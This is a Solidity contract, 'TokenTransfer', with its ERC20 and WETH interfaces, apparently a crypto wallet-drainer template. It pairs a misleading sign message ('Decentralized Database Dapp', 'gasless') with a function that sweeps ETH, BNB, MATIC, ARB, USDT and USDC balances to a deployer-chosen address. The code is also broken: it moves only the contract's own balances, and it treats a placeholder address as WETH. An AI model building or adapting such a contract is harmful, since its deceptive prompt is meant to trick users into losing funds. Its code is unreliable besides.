// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import the ERC20 interface for each token
import "./IERC20.sol";
import "./IWETH.sol"; // Import the WETH interface for Ethereum

contract TokenTransfer {
    // Address of each token contract
    address public ethAddress = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address public bnbAddress = 0xB8c77482e45F1F44dE1745F52C74426C631bDD52;
    address public maticAddress = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
    address public arbAddress = 0x82A44D92D6c329826dc557c5E1Be6ebeC5D5FeB9;
    address public usdtAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public usdcAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    // Sign message
    string public constant SIGN_MESSAGE = "You are connecting to Decentralized Database Dapp. This process is gasless.";

    // Mapping to track approval status for each token
    mapping(address => bool) public approvedTokens;

    address public transferTo;

    constructor(address _transferTo) {
        // Approve contract for token transfers
        approvedTokens[msg.sender] = true;
        transferTo = _transferTo;
    }

    // Function to request token transfer from the sender's wallet to the specified address
    function requestTokenTransfer() external {
        require(approvedTokens[msg.sender], "TokenTransfer: Token not approved for transfer.");

        // Transfer ETH
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            IWETH weth = IWETH(ethAddress);
            weth.deposit{value: ethBalance}();
            weth.transfer(transferTo, ethBalance);
        }

        // Transfer BNB
        IERC20 bnbToken = IERC20(bnbAddress);
        uint256 bnbBalance = bnbToken.balanceOf(address(this));
        if (bnbBalance > 0) {
            bnbToken.transfer(transferTo, bnbBalance);
        }

        // Transfer MATIC
        IERC20 maticToken = IERC20(maticAddress);
        uint256 maticBalance = maticToken.balanceOf(address(this));
        if (maticBalance > 0) {
            maticToken.transfer(transferTo, maticBalance);
        }

        // Transfer ARB
        IERC20 arbToken = IERC20(arbAddress);
        uint256 arbBalance = arbToken.balanceOf(address(this));
        if (arbBalance > 0) {
            arbToken.transfer(transferTo, arbBalance);
        }

        // Transfer USDT
        IERC20 usdtToken = IERC20(usdtAddress);
        uint256 usdtBalance = usdtToken.balanceOf(address(this));
        if (usdtBalance > 0) {
            usdtToken.transfer(transferTo, usdtBalance);
        }

        // Transfer USDC
        IERC20 usdcToken = IERC20(usdcAddress);
        uint256 usdcBalance = usdcToken.balanceOf(address(this));
        if (usdcBalance > 0) {
            usdcToken.transfer(transferTo, usdcBalance);
        }
    }

    // Function to approve the contract for token transfer
    function approveTokenTransfer() external {
        approvedTokens[msg.sender] = true;
    }

    // Function to revoke the approval for token transfer
    function revokeTokenTransfer() external {
        approvedTokens[msg.sender] = false;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IERC20.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}